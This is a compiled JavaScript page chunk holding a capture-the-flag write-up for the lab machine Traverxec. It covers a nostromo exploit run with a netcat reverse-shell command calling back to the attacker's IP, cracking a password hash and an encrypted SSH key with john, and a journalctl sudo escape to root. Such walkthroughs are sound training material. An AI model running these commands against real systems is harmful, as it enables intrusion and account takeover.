(window.webpackJsonp=window.webpackJsonp||[]).push([[92],{435:function(s,e,t){"use strict";t.r(e);var a=t(13),r=Object(a.a)({},(function(){var s=this,e=s._self._c;return e("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[e("h1",{attrs:{id:"traverxec"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#traverxec"}},[s._v("#")]),s._v(" Traverxec")]),s._v(" "),e("p",[s._v("IP: "),e("code",[s._v("10.10.10.165")])]),s._v(" "),e("h2",{attrs:{id:"port-80"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#port-80"}},[s._v("#")]),s._v(" Port 80")]),s._v(" "),e("ul",[e("li",[s._v("Readme with basic template from a website caled templatemag")]),s._v(" "),e("li",[s._v("Server is "),e("code",[s._v("nostromo 1.9.6")])]),s._v(" "),e("li",[s._v("Use this exploit: https://www.exploit-db.com/exploits/47837")]),s._v(" "),e("li",[s._v("Make a reverse shell with:")])]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("python cve2019_16278.py "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("10.10")]),s._v(".10.165 "),e("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v('"nc -e /bin/sh 10.10.14.21 443"')]),s._v("\n")])])]),e("p",[s._v("Upgrade to TTY shell:")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("python "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token string"}},[s._v("'import pty; pty.spawn(\"/bin/sh\")'")]),s._v("\n")])])]),e("h2",{attrs:{id:"user-esc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#user-esc"}},[s._v("#")]),s._v(" User esc")]),s._v(" "),e("ul",[e("li",[s._v("Sudo version 1.8.27")]),s._v(" "),e("li",[s._v("password for david: "),e("code",[s._v("david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/")])]),s._v(" "),e("li",[s._v("Quick john the ripper gives "),e("code",[s._v("Nowonly4me (david)")])]),s._v(" "),e("li",[s._v("Neither SSH nor su works with the david password")]),s._v(" "),e("li",[s._v("We find another directory that's intereting which is david's homedirectory")])]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("homedirs                /home\nhomedirs_public         public_www\n")])])]),e("p",[s._v("shows that there should be a folder inside the home directory of david")]),s._v(" "),e("p",[s._v("We can copy that protected file to a tmp directory and untar &unzip it.")]),s._v(" "),e("p",[s._v("Grabbing the id_rsa file and outputting it locally, we see that it's encrypted. Let's convert the ssh to john format using "),e("code",[s._v("sshng2john.py")])]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("python sshng2john.py id_rsa "),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" id_rsa_hashes\n"),e("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" john "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--wordlist")]),e("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/usr/share/wordlists/rockyou.txt id_rsa_hashes\n"),e("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# password is hunter")]),s._v("\n")])])]),e("p",[s._v("Now lets make an unencrypted id_rsa")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[s._v("openssl rsa "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-in")]),s._v(" id_rsa "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-out")]),s._v(" id_rsa_uncrypted\n")])])]),e("p",[s._v("and ssh with david:")]),s._v(" "),e("div",{staticClass:"language-sh extra-class"},[e("pre",{pre:!0,attrs:{class:"language-sh"}},[e("code",[e("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" "),e("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-i")]),s._v(" id_rsa_uncrypted david@10.10.10.165\n")])])]),e("h2",{attrs:{id:"priv-esc"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#priv-esc"}},[s._v("#")]),s._v(" Priv esc")]),s._v(" "),e("p",[s._v("we see that in the "),e("code",[s._v("server-stats.sh")]),s._v(" file, journalctl is being called with sudo.")]),s._v(" "),e("p",[s._v("We also notice that it has to be called with the parameters given asides from the pipe.")]),s._v(" "),e("p",[s._v("There is a priv esc for it: https://gtfobins.github.io/gtfobins/journalctl/")]),s._v(" "),e("p",[s._v("and since journalctl is like "),e("code",[s._v("less")]),s._v(", we can invoke a shell from the less prompt. Simply shrink the screen until all the output can't be outputted in a single command, then a prompt will appear such that we can use "),e("code",[s._v("!/bin/sh")])])])}),[],!1,null,null,null);e.default=r.exports}}]);